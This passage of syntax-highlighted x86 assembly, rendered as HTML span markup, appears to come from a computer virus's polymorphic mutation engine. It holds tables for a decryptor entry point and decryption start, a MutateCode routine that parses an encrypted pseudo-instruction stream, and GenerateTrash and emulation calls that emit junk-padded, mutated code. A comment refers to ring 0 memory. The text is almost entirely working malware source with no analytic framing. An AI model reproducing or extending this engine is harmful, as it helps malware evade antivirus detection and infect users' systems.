        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Undefined</span><span class="sc4">+</span><span class="sc5">Writeable</span><span class="sc0">      
   </span><span class="sc5">EsiTable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Undefined</span><span class="sc4">+</span><span class="sc5">Writeable</span><span class="sc0">      
   </span><span class="sc5">EdiTable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Undefined</span><span class="sc4">+</span><span class="sc5">Writeable</span><span class="sc0">   

   </span><span class="sc1">; this table is copied to mem, its used to define</span><span class="sc0">
   </span><span class="sc1">; starting values for the memory</span><span class="sc0">
   </span><span class="sc1">; Undefined mem start as Undefined+Writeable (you could change this to</span><span class="sc0">
   </span><span class="sc1">; only writable for slightly better code.)</span><span class="sc0">

   </span><span class="sc5">Mem1Table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0">                               </span><span class="sc1">; how many tables</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">; which table</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Undefined</span><span class="sc0">              </span><span class="sc1">; program entry point</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Undefined</span><span class="sc0">              </span><span class="sc1">; pointer to mem 0</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Undefined</span><span class="sc0">              </span><span class="sc1">; decryptor entry point</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Undefined</span><span class="sc0">              </span><span class="sc1">; where to start decrypt</span><span class="sc0">


   </span><span class="sc5">RandomRegs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Registers</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(-</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">              </span><span class="sc1">; Random Regs</span><span class="sc0">
        



</span><span class="sc1">; mutates the code in esi and places the result in edi</span><span class="sc0">
</span><span class="sc1">; returns a pointer to the created code in esi</span><span class="sc0">
</span><span class="sc1">; returns a pointer to the created code + sizeof(created code) in edi</span><span class="sc0">
     </span><span class="sc5">MutateCode</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

      </span><span class="sc5">MorphCodeLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EndWhere</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Parse</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">MorphCodeLoop</span><span class="sc0">


  </span><span class="sc5">MutateEnd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; return address of Parse</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0fffffff0h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">






</span><span class="sc1">; ----------------------- Parser</span><span class="sc0">

</span><span class="sc5">ParseSpecialVariables</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">ParseSpecialVariablesEnd</span><span class="sc4">-</span><span class="sc5">ParseSpecialVariables</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_db</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Op_encrypt</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Op_setinfo</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Op_offset</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Op_prefix</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_trash</span><span class="sc4">,</span><span class="sc5">Op_dontparse</span><span class="sc4">,</span><span class="sc5">Op_jmp</span><span class="sc0">
</span><span class="sc5">ParseSpecialVariablesEnd</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">ParseSpecialProcedures</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">ParseDeclareByte</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ParseEncrypt</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ParseChangeInfo</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">ParseSaveOffset</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ParsePrefix</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ParseTrash</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ParseDontParse</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">TemporaryParseJump</span><span class="sc0">
</span><span class="sc5">ParseSpecialProceduresEnd</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">ParseInstructionData</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">ParseInstructionDataEnd</span><span class="sc4">-</span><span class="sc5">ParseInstructionData</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_add</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Op_mov</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Op_sub</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Op_or</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Op_xor</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Op_and</span><span class="sc0">
</span><span class="sc5">ParseInstructionDataEnd</span><span class="sc4">:</span><span class="sc0">





        </span><span class="sc5">AddPos</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">MovPos</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc5">SubPos</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc5">OrPos</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc5">XorPos</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc5">AndPos</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">5</span><span class="sc0">


</span><span class="sc5">InstructionData</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">AddInfo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AddInstruction</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_add</span><span class="sc0">

</span><span class="sc5">MovInfo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MovInstruction</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_mov</span><span class="sc0">

</span><span class="sc5">SubInfo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SubInstruction</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_sub</span><span class="sc0">

</span><span class="sc5">OrInfo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OrInstruction</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_or</span><span class="sc0">

</span><span class="sc5">XorInfo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">XorInstruction</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_xor</span><span class="sc0">

</span><span class="sc5">AndInfo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AndInstruction</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_and</span><span class="sc0">




</span><span class="sc5">InstuctionTablesEnd</span><span class="sc4">:</span><span class="sc0">




</span><span class="sc5">Parse</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ParseSpecialVariables</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ParseSpecialVariables</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">



        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasd</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ParseInstruction</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ParseSpecialProceduresEnd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">


     </span><span class="sc5">ParseDeclareByte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Op_db</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OutputOnlyOpcode</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; number of bytes to declare</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">ParseEncrypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetOperand</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">ParseChangeInfo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">666666h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetOperand</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ChangeInfo</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">ParseSaveOffset</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Op_offset</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OutputOnlyOpcode</span><span class="sc0">
        </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">ParsePrefix</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">Prefix</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">ParseTrash</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">HowMuchTrash</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">ParseDontParse</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0fffffff0h</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">TemporaryParseJump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0fffffff0h</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OutputPrefix</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Op_jmp</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetOperand</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">']'</span><span class="sc4">*</span><span class="sc2">256</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'R['</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


        
  </span><span class="sc5">ParseInstruction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ParseInstructionData</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ParseInstructionData</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">MutateEnd</span><span class="sc0">
        

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">InstuctionTablesEnd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

     </span><span class="sc5">ParseOperands</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetOperand</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; ToType</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; ToOperand</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetOperand</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; FromTypeOfValue</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; FromOperand</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EndValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EndTypeOfValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenerateTrash</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; ToOperand</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; ToType</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Writeable</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeleteFromInfo</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">FromOperand</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">FromTypeOfValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ToOperand</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ToType</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Writeable</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeleteFromInfo</span><span class="sc0">


        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EmulateInstruction</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OutputPrefix</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EmuProc</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenerateTrash</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; return</span><span class="sc0">
</span><span class="sc1">; eax = register or number</span><span class="sc0">
</span><span class="sc1">; ebx =</span><span class="sc0">
</span><span class="sc1">; 0 = value/number</span><span class="sc0">
</span><span class="sc1">; 4 = value/register</span><span class="sc0">
</span><span class="sc1">; 8 = memory/number</span><span class="sc0">
</span><span class="sc1">; 12 = memory/register</span><span class="sc0">


</span><span class="sc1">; return</span><span class="sc0">
</span><span class="sc1">; EBX = 0 if value and 4 if memory</span><span class="sc0">
</span><span class="sc1">;                       |'V' or 'M'</span><span class="sc0">
</span><span class="sc1">;                       |</span><span class="sc0">
</span><span class="sc1">;               db     "M"</span><span class="sc0">
</span><span class="sc5">ReadTypeOfData</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc0">
        </span><span class="sc6">sete</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; return</span><span class="sc0">
</span><span class="sc1">; EAX = the number or register</span><span class="sc0">
</span><span class="sc1">; EBX = 0 if number and 4 if register</span><span class="sc0">

</span><span class="sc1">; This procedure is in the "copy to ring 0" mem.</span><span class="sc0">

</span><span class="sc1">;GetOperand:</span><span class="sc0">
</span><span class="sc1">;        xor     edx,edx</span><span class="sc0">
</span><span class="sc1">;        mov     al,byte ptr [esi]</span><span class="sc0">
</span><span class="sc1">;        cmp     al,'['</span><span class="sc0">
</span><span class="sc1">;        setz    dl</span><span class="sc0">
</span><span class="sc1">;        mov     ecx,edx</span><span class="sc0">
</span><span class="sc1">;        add     esi,edx</span><span class="sc0">
</span><span class="sc1">;        shl     edx,3  </span><span class="sc0">
</span><span class="sc1">;        mov     ebx,edx                         ; ebx = 0 or 8</span><span class="sc0">

</span><span class="sc1">;        lodsb</span><span class="sc0">
</span><span class="sc1">;        cmp     al,'S'                          ; A variable</span><span class="sc0">
</span><span class="sc1">;        jnz     Label53</span><span class="sc0">

</span><span class="sc1">;        mov     eax,[PointerToDataSlack+ebp]</span><span class="sc0">
</span><span class="sc1">;        mov     edx,[esi]</span><span class="sc0">
</span><span class="sc1">;        mov     eax,[eax+edx*4]</span><span class="sc0">
</span><span class="sc1">;        mov     [esi],eax</span><span class="sc0">
</span><span class="sc1">;        mov     eax,'V'</span><span class="sc0">
</span><span class="sc1">;        xor     edx,edx</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     Label53:</span><span class="sc0">
</span><span class="sc1">;        cmp     al,'R'</span><span class="sc0">
</span><span class="sc1">;        setz    dl</span><span class="sc0">
</span><span class="sc1">;        shl     edx,2</span><span class="sc0">
</span><span class="sc1">;        add     ebx,edx                         ; ebx = ebx + (0 or 4)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        test    edx,edx                         ; is value</span><span class="sc0">
</span><span class="sc1">;        jz      ReadValue</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        xor     eax,eax                         </span><span class="sc0">
</span><span class="sc1">;        lodsb                                   ; read register</span><span class="sc0">
